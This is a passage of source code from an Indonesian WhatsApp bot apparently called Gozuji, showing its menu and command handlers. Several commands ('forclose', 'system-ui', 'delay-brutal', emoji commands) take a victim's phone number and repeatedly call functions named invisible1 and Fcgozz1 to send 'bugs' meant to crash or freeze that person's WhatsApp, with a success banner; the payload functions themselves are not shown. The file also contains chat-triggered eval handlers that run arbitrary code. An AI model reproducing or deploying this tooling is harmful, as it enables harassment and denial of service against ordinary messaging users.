let anj = `\`𝐡̲𝐚̲𝐥̲𝐨̲ 𝐬̲𝐚̲𝐲̲𝐚̲ 𝐚̲𝐝̲𝐚̲𝐥̲𝐚̲𝐡̲ 𝐬̲𝐜̲𝐫̲𝐢̲𝐩̲𝐭̲ 𝐛̲𝐨̲𝐭̲ 𝐠̲𝐨̲𝐳̲𝐮̲𝐣̲𝐢̲ 𝐲̲𝐚̲𝐧̲𝐠̲ 𝐬̲𝐢̲𝐚̲𝐩̲ 𝐦̲𝐞̲𝐥̲𝐚̲𝐲̲𝐚̲𝐧̲𝐢̲ 𝐚̲𝐧̲𝐝̲𝐚̲ 𝐬̲𝐞̲𝐩̲𝐞̲𝐧̲𝐮̲𝐡̲𝐧̲𝐲̲𝐚̲,̲ 𝐬̲𝐚̲𝐲̲𝐚̲ 𝐝̲𝐢̲𝐜̲𝐢̲𝐩̲𝐭̲𝐚̲𝐤̲𝐚̲𝐧̲ 𝐮̲𝐧̲𝐭̲𝐮̲𝐤̲ 𝐛̲𝐮̲𝐠̲ 𝐩̲𝐞̲𝐧̲𝐢̲𝐩̲𝐮̲/̲𝐩̲𝐞̲𝐦̲𝐛̲𝐞̲𝐧̲𝐜̲𝐢̲,̲ 𝐡̲𝐚̲𝐫̲𝐚̲𝐩̲ 𝐠̲𝐮̲𝐧̲𝐚̲𝐤̲𝐚̲𝐧̲ 𝐬̲𝐚̲𝐲̲𝐚̲ 𝐝̲𝐞̲𝐧̲𝐠̲𝐚̲𝐧̲ 𝐛̲𝐢̲𝐣̲𝐚̲𝐤̲\`

ᖫ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁 ᖭ
✯ 𝐃𝐞𝐯 : 𝐋𝐢𝐚𝐦
✯ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : 螿蒙𝐆𝐨𝐳𝐮𝐣𝐢螿蒙
✯ 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝟏̴𝟐̴.̴𝟎̴.̴𝟎̴
✯ 𝐎𝐰𝐧𝐞𝐫 : 𝐗𝐲𝐫𝐨𝐲𝐳
✯ 𝐌𝐨𝐝𝐞 : 𝐕𝐯𝐢𝐩
✯ 𝐁𝐨𝐭 𝐌𝐨𝐝𝐞 : ${korps.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐒𝐞𝐥𝐟'}
   
╭━【 𝑽𝑽𝑰𝑷 】━━━ϟ
┇︻   
┇● ɢᴀɴᴀs ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇● ʙᴜɢ-ɢᴀɴᴀs ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇● ғᴏʀᴄʟᴏsᴇ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● sʏsᴛᴇᴍ-ᴜɪ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● ғᴄ-sʏsᴛᴇᴍ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇︼
╰━━━━━━━━━━━━━━━━ϟ
╭━【 𝐁𝐔𝐆 𝐄𝐌𝐎𝐉𝐈 】━━━ϟ
┇︻ 
┇● ☠️ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● 🥵 ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● 🌀 ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● 🔥 ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇︼
╰━━━━━━━━━━━━━━━━ 
╭━【 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 】━━━ϟ
┇︻ 
┇● ɪɴᴠɪs-ᴅᴇʟᴀʏ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇● ᴅᴇʟᴀʏ-ᴍᴀɴᴇɴ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇● ᴅᴇʟᴀʏ-ᴋᴏʀᴘs ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇● ᴅᴇʟᴀʏ-ʙʀᴜᴛᴀʟ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽ 
┇︼
╰━━━━━━━━━━━━━━━━
╭━【 𝙈𝙀𝙉𝙐 𝙊𝙒𝙉𝙀𝙍 】━━━ϟ
┇︻ 
┇● ᴄʟᴇᴀʀʙᴜɢ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● ᴀᴅᴅᴘʀᴇᴍ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇● ᴅᴇʟᴘʀᴇᴍ ⧼ 𝘛𝘈𝘙𝘎𝘌𝘛 ⧽
┇︼
╰━━━━━━━━━━━━━━━━
LINK SCRIP : https://chat.whatsapp.com/LSwHfHD1rSbLoblViqyM2p?mode=ac_t
`
await loadmenugoz()
await korps.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/34f0ek.jpg" },
caption: anj,
contextInfo: {
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: "https://Bít.ly/gozuji",
newsletterJid: "120363378510313540@newsletter"
},
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: global.namabot,
body: "ᖫ𝐆𝐨𝐨𝐳 𝐔𝐉𝐈 ✮ 𝐔𝐥𝐢𝐦𝐢𝐧𝐚𝐭𝐞ᖭ",
mediaType: 3,
renderLargerThumbnail: false,
thumbnail: babi,
sourceUrl: "https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y"
}
}
}, {quoted: lol });
await korps.sendMessage(m.chat, {
audio: musicKorps,
mimetype: 'audio/mpeg',
ptt: true
}, {quoted: fkontak });
}
break;
case 'delay-brutal': case 'invis-delay': 
case 'delay-korps': case 'delay-manen': 
case '☠️': case '🔥': case '🌀': 
case '🥵': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: ${prefix + command} 628×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
for (let i = 0; i < 10; i++) {
await invisible1(target)
await sleep(1000)
}
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'forclose': case 'system-ui': 
case 'fc-system': case 'ganas': 
case 'bug-ganas': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: ${prefix + command} 628×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
for (let i = 0; i < 10; i++) {
await Fcgozz1(target)
}
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'addprem': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return replyLFH(`𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁 𝚈𝙶 𝙼𝙰𝚄 𝙳𝙸 𝙰𝙳𝙳𝙿𝚁𝙴𝙼 𝙲𝙾𝙽𝚃𝙾𝙷 : ${prefix + command} @tag|30d`)
    if (!hari) return replyLFH(`𝙰𝙳𝙳𝙿𝚁𝙴𝙼 𝙱𝙴𝚁𝙰𝙿𝙰 𝙷𝙰𝚁𝙸?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return replyLFH('𝙰𝙽𝙳𝙰 𝚂𝚄𝙳𝙰𝙷 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return replyLFH('𝚂𝚄𝙺𝚂𝙴𝚂 𝙰𝙳𝙳𝙿𝚁𝙴𝙼✅')
    let data = await korps.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('𝚂𝚄𝙺𝚂𝙴𝚂 𝙰𝙳𝙳𝙿𝚁𝙴𝙼')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `⧼𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙂𝙊𝙕𝙐𝙅𝙄⧽`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/ii5j8m.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y'
                }	
            }	
        };	
        return korps.sendMessage(m.chat, contentText, { quoted: jem })
    } else {		
         replyLFH("not found")
    }	
}
break       
case 'delprem': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
    if (!args[0]) return replyLFH(`𝚂𝙸𝙰𝙿𝙰 𝚈𝙰𝙽𝙶 𝙼𝙰𝚄 𝙳𝙸 ${command}? 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁 𝙰𝚃𝙰𝚄 𝚃𝙰𝙶 𝙲𝙾𝙽𝚃𝙾𝙷 : ${prefix} 𝙳𝙴𝙻𝙿𝚁𝙴𝙼 @𝟼𝟸+++`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return replyLFH("𝙽𝙾𝚃 𝚄𝚂𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼")
    let data = await korps.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium))		
        replyLFH('𝚂𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 𝙽𝚄𝙼𝙱𝙴𝚁 𝚃𝙴𝙻𝙰𝙷 𝙳𝙸𝙷𝙰𝙿𝚄𝚂')
    } else {	
        replyLFH("not found")
    }
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
